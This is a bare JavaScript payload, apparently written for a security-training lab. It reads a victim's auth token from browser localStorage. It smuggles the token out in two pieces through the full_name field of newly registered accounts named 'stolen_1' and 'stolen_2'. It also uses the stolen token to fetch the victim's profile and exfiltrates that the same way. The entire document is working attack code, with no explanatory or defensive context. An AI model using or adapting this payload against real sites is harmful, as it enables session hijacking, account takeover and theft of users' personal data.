(function () {
  var t = localStorage.getItem("token") || "NOTOKEN";
  function reg(uname, blob) {
    fetch("https://lab-1784736030322-iqkdwd.labs-app.bugforge.io/api/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: uname, password: "flag1234",
        email: uname + "@x.com",
        full_name: String(blob).slice(0, 240)
      })
    });
  }
reg("stolen_1", "TOKA:" + t.slice(0, 230));
reg("stolen_2", "TOKB:" + t.slice(230));
  fetch("https://lab-1784736030322-iqkdwd.labs-app.bugforge.io//api/profile", {
    headers: { Authorization: "Bearer " + t }
  }).then(r => r.text()).then(b => reg("pe_prof", "PROF:" + b));
})();
